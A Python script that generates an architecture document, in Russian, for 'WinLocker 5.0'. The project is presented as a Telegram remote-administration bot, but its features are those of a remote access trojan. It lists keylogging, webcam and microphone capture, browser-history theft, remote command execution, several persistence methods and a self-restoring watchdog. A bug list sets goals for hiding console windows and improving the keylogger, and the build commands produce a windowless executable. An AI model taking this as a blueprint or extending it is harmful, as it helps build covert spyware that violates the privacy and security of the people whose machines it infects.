#!/usr/bin/env python3
"""
Модуль для генерации архитектурного документа проекта WinLocker 5.0
"""

import os
import io
import sys
from datetime import datetime


def generate_architecture_document():
    """Генерация полного архитектурного документа проекта"""
    
    # Собираем информацию о файлах проекта
    project_files = []
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.endswith(('.py', '.cpp', '.dll', '.bat', '.spec', '.txt', '.md', '.json')):
                rel_path = os.path.join(root, file)
                # Пропускаем скрытые директории
                if '.git' in rel_path or '.vscode' in rel_path or '__pycache__' in rel_path:
                    continue
                project_files.append(rel_path)
    
    # Сортируем файлы
    project_files.sort()
    
    # Формируем документ
    doc = []
    doc.append("=" * 80)
    doc.append("АРХИТЕКТУРА ПРОЕКТА WINLOCKER 5.0")
    doc.append(f"Сгенерировано: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    doc.append("=" * 80)
    doc.append("")
    
    # 1. Суть проекта
    doc.append("1. СУТЬ ПРОЕКТА")
    doc.append("-" * 40)
    doc.append("Telegram-бот для удаленного администрирования Windows с модулем Watchdog и DLL-интеграцией.")
    doc.append("Основные возможности:")
    doc.append("  • Удаленное управление Windows-устройствами через Telegram")
    doc.append("  • Модуль Watchdog для автоматического восстановления бота")
    doc.append("  • Интеграция с системной DLL для низкоуровневых операций")
    doc.append("  • Мульти-администраторская система с ролевым доступом")
    doc.append("  • Шифрованное логирование и кейлоггинг")
    doc.append("  • Автозапуск через реестр, папку автозагрузки и планировщик задач")
    doc.append("")
    
    # 2. Структура файлов
    doc.append("2. СТРУКТУРА ФАЙЛОВ (File Tree)")
    doc.append("-" * 40)
    doc.append("Основные модули проекта:")
    doc.append("")
    
    # Группируем файлы по типам
    py_files = [f for f in project_files if f.endswith('.py')]
    cpp_files = [f for f in project_files if f.endswith('.cpp')]
    dll_files = [f for f in project_files if f.endswith('.dll')]
    bat_files = [f for f in project_files if f.endswith('.bat')]
    spec_files = [f for f in project_files if f.endswith('.spec')]
    
    doc.append("Python модули (.py):")
    for file in sorted(py_files):
        doc.append(f"  • {file}")
    
    doc.append("")
    doc.append("C++ исходники (.cpp):")
    for file in sorted(cpp_files):
        doc.append(f"  • {file}")
    
    doc.append("")
    doc.append("DLL файлы (.dll):")
    for file in sorted(dll_files):
        doc.append(f"  • {file}")
    
    doc.append("")
    doc.append("Batch скрипты (.bat):")
    for file in sorted(bat_files):
        doc.append(f"  • {file}")
    
    doc.append("")
    doc.append("PyInstaller спецификации (.spec):")
    for file in sorted(spec_files):
        doc.append(f"  • {file}")
    
    doc.append("")
    doc.append("Описание ключевых модулей:")
    doc.append("  • main_bot.py - главный модуль бота, точка входа")
    doc.append("  • bot_core.py - ядро бота, управление состояниями и сессиями")
    doc.append("  • bot_commands.py - обработчики Telegram-команд")
    doc.append("  • bot_callbacks.py - обработчики callback-запросов от inline-кнопок")
    doc.append("  • bot_services.py - системные сервисы (скриншоты, процессы и т.д.)")
    doc.append("  • unified_logger.py - унифицированный логгер с шифрованием")
    doc.append("  • database.py - управление SQLite базой данных")
    doc.append("  • system_dll.py - Python-обертка для system_core.dll")
    doc.append("  • system_core.cpp - C++ исходники системной DLL")
    doc.append("  • watchdog.py - модуль мониторинга и восстановления бота")
    doc.append("  • readme.py - документация и команда /guide")
    doc.append("")
    
    # 3. Архитектура DLL
    doc.append("3. АРХИТЕКТУРА DLL (system_core.dll)")
    doc.append("-" * 40)
    doc.append("Системные вызовы Windows, вынесенные в DLL:")
    doc.append("")
    doc.append("Функции управления системой:")
    doc.append("  • lock_workstation() - блокировка рабочей станции")
    doc.append("  • shutdown_system(force: int) - выключение компьютера")
    doc.append("  • reboot_system(force: int) - перезагрузка компьютера")
    doc.append("")
    doc.append("Функции управления процессами:")
    doc.append("  • kill_process_by_name(process_name: str) - завершение процесса по имени")
    doc.append("  • kill_process_by_id(pid: int) - завершение процесса по ID")
    doc.append("  • get_process_list() -> str - получение списка процессов в JSON")
    doc.append("")
    doc.append("Функции управления окнами:")
    doc.append("  • get_active_window_title() -> str - получение заголовка активного окна")
    doc.append("  • minimize_all_windows() - свернуть все окна")
    doc.append("  • hide_window_by_title(title: str) - скрыть окно по заголовку")
    doc.append("  • show_window_by_title(title: str) - показать окно по заголовку")
    doc.append("")
    doc.append("Функции управления звуком:")
    doc.append("  • set_system_volume(level: int) - установка уровня громкости (0-100)")
    doc.append("  • mute_system_volume() - отключение звука")
    doc.append("  • unmute_system_volume() - включение звука")
    doc.append("")
    doc.append("Прочие функции:")
    doc.append("  • execute_command(command: str) - выполнение команды CMD")
    doc.append("  • create_hidden_process(exe_path: str, args: str) - создание скрытого процесса")
    doc.append("  • get_system_info_string() -> str - получение системной информации в JSON")
    doc.append("")
    doc.append("Python-интеграция через ctypes:")
    doc.append("  • SystemDLL класс в system_dll.py загружает DLL через ctypes.CDLL()")
    doc.append("  • Настройка сигнатур функций с указанием типов аргументов и возвращаемых значений")
    doc.append("  • Обработка ошибок загрузки DLL с созданием заглушек (stubs)")
    doc.append("  • Автоматическое освобождение памяти через free_string()")
    doc.append("")
    
    # 4. Структура Базы Данных
    doc.append("4. СТРУКТУРА БАЗЫ ДАННЫХ (SQLite)")
    doc.append("-" * 40)
    doc.append("Таблицы базы данных:")
    doc.append("")
    doc.append("Таблица: admins")
    doc.append("  • id INTEGER PRIMARY KEY AUTOINCREMENT")
    doc.append("  • telegram_id INTEGER UNIQUE NOT NULL")
    doc.append("  • username TEXT")
    doc.append("  • role TEXT DEFAULT 'admin' (super_admin/admin)")
    doc.append("  • created_at DATETIME DEFAULT CURRENT_TIMESTAMP")
    doc.append("  • is_active INTEGER DEFAULT 1")
    doc.append("")
    doc.append("Таблица: devices")
    doc.append("  • id INTEGER PRIMARY KEY AUTOINCREMENT")
    doc.append("  • hwid TEXT UNIQUE NOT NULL (Hardware ID устройства)")
    doc.append("  • device_name TEXT NOT NULL")
    doc.append("  • last_online DATETIME")
    doc.append("  • watchdog_status TEXT DEFAULT 'active'")
    doc.append("  • ip_address TEXT")
    doc.append("  • created_at DATETIME DEFAULT CURRENT_TIMESTAMP")
    doc.append("  • is_active INTEGER DEFAULT 1")
    doc.append("")
    doc.append("Таблица: sessions")
    doc.append("  • id INTEGER PRIMARY KEY AUTOINCREMENT")
    doc.append("  • admin_id INTEGER NOT NULL (ссылка на admins.id)")
    doc.append("  • device_id INTEGER (ссылка на devices.id)")
    doc.append("  • session_start DATETIME DEFAULT CURRENT_TIMESTAMP")
    doc.append("  • session_end DATETIME")
    doc.append("")
    doc.append("Таблица: action_logs")
    doc.append("  • id INTEGER PRIMARY KEY AUTOINCREMENT")
    doc.append("  • admin_id INTEGER")
    doc.append("  • device_id INTEGER")
    doc.append("  • action_type TEXT NOT NULL")
    doc.append("  • action_details TEXT")
    doc.append("  • timestamp DATETIME DEFAULT CURRENT_TIMESTAMP")
    doc.append("")
    
    # 5. Текущий функционал
    doc.append("5. ТЕКУЩИЙ ФУНКЦИОНАЛ")
    doc.append("-" * 40)
    doc.append("Полный список реализованных Telegram-команд:")
    doc.append("")
    doc.append("Основные команды управления:")
    doc.append("  • /start - запуск бота и регистрация устройства")
    doc.append("  • /panel - интерактивная панель управления с inline-кнопками")
    doc.append("  • /pc_list - список всех зарегистрированных устройств")
    doc.append("  • /info - информация о выбранном устройстве")
    doc.append("")
    doc.append("Команды мониторинга:")
    doc.append("  • /screen - скриншот экрана")
    doc.append("  • /active - активное окно/приложение")
    doc.append("  • /procs - список процессов")
    doc.append("  • /kill [имя] - завершение процесса")
    doc.append("  • /webcam [секунды] - захват с веб-камеры")
    doc.append("  • /mic [секунды] - запись с микрофона")
    doc.append("  • /keyboard - лог клавиатуры и буфера обмена")
    doc.append("  • /clipboard - содержимое буфера обмена")
    doc.append("  • /history - история браузера Chrome")
    doc.append("  • /app_list - список установленных приложений")
    doc.append("")
    doc.append("Команды управления системой:")
    doc.append("  • /cmd [команда] - выполнение команды CMD")
    doc.append("  • /lock - блокировка компьютера")
    doc.append("  • /poweroff - выключение компьютера")
    doc.append("  • /reboot - перезагрузка компьютера")
    doc.append("  • /volume [уровень] - установка громкости (0-100)")
    doc.append("  • /message [текст] - отправка сообщения на устройство")
    doc.append("")
    doc.append("Команды файловой системы:")
    doc.append("  • /list_files [путь] - просмотр файлов в директории")
    doc.append("  • /change_dir [путь] - изменение рабочей директории")
    doc.append("  • /download [путь] - загрузка файла с устройства")
    doc.append("  • /rm [путь] - удаление файла")
    doc.append("")
    doc.append("Команды администрирования:")
    doc.append("  • /add_admin [id] - добавление администратора (SuperAdmin)")
    doc.append("  • /del_admin [id] - удаление администратора (SuperAdmin)")
    doc.append("  • /admin_list - список всех администраторов")
    doc.append("  • /cleanup_db - очистка дубликатов в БД (SuperAdmin)")
    doc.append("")
    doc.append("Команды обновления и обслуживания:")
    doc.append("  • /urs_update [url] - OTA обновление по ссылке")
    doc.append("  • /wd_download [url] - загрузка watchdog.exe")
    doc.append("  • /wd_on - запуск watchdog")
    doc.append("  • /wd_off - остановка watchdog")
    doc.append("  • /uninstall - полное удаление бота")
    doc.append("  • /rename_bot [имя] - переименование исполняемого файла")
    doc.append("  • /rename_wd [имя] - переименование watchdog.exe")
    doc.append("  • /rename_pc [имя] - изменение имени устройства")
    doc.append("")
    doc.append("Служебные команды:")
    doc.append("  • /commands или /coms - полный список команд")
    doc.append("  • /guide - этот архитектурный документ")
    doc.append("")
    
    # 6. Текущие баги и задачи
    doc.append("6. ТЕКУЩИЕ БАГИ И ЗАДАЧИ (Критически важный раздел)")
    doc.append("-" * 40)
    doc.append("Список того, что сломано и требует переработки в будущем:")
    doc.append("")
    doc.append("1. Скрытность:")
    doc.append("   • Всплывают окна терминала/PowerShell при выполнении команд")
    doc.append("   • Требуется полный переход на subprocess с флагом CREATE_NO_WINDOW")
    doc.append("")
    doc.append("2. Кейлоггер:")
    doc.append("   • Логика перехвата клавиш работает некорректно")
    doc.append("   • Нужен умный хронологический перехват только нажатий с учетом смены окон")
    doc.append("   • Проблемы с обработкой специальных клавиш (Backspace, Delete, Enter)")
    doc.append("")
    doc.append("3. Сканирование:")
    doc.append("   • Ошибки вида 'tuple' object has no attribute 'get' в функциях сканирования")
    doc.append("   • Нестабильная работа deep_scan и full_scan")
    doc.append("   • Проблемы с получением информации о сети и дисках")
    doc.append("")
    doc.append("4. Файловая система:")
    doc.append("   • Отказ от ручных команд в пользу интерактивного Telegram-проводника на Inline-кнопках")
    doc.append("   • Проблемы с валидацией путей и защитой от directory traversal атак")
    doc.append("   • Ограничения на размер файлов при загрузке")
    doc.append("")
    doc.append("5. Сломанные функции:")
    doc.append("   • Ошибка при получении активного окна (WinError 2)")
    doc.append("   • Сбои в управлении звуком через DLL (WinError 2)")
    doc.append("   • Проблемы с определением IP-адреса при отсутствии интернета")
    doc.append("   • Unicode encoding issues в Windows console (CP1251 vs UTF-8)")
    doc.append("")
    doc.append("6. Архитектурные проблемы:")
    doc.append("   • Слишком сильная связность модулей")
    doc.append("   • Отсутствие unit-тестов")
    doc.append("   • Проблемы с обработкой ошибок в некоторых функциях")
    doc.append("   • Неоптимальное использование памяти в unified_logger")
    doc.append("")
    
    # 7. Инструкции по сборке
    doc.append("7. ИНСТРУКЦИИ ПО СБОРКЕ")
    doc.append("-" * 40)
    doc.append("Сборка system_core.dll через MinGW:")
    doc.append("  1. Установить MinGW-w64 (x86_64-posix-seh)")
    doc.append("  2. Добавить путь к g++ в переменную PATH")
    doc.append("  3. Выполнить команду:")
    doc.append("     g++ -shared -o system_core.dll system_core.cpp -lpsapi -luser32 -ladvapi32")
    doc.append("")
    doc.append("Сборка mainbot.exe через PyInstaller:")
    doc.append("  1. Установить зависимости: pip install -r requirements.txt")
    doc.append("  2. Выполнить команду:")
    doc.append("     pyinstaller --onefile --noconsole --name mainbot --icon icon.ico main_bot.py")
    doc.append("  3. Или использовать скрипт build_mainbot.bat")
    doc.append("")
    
    return doc
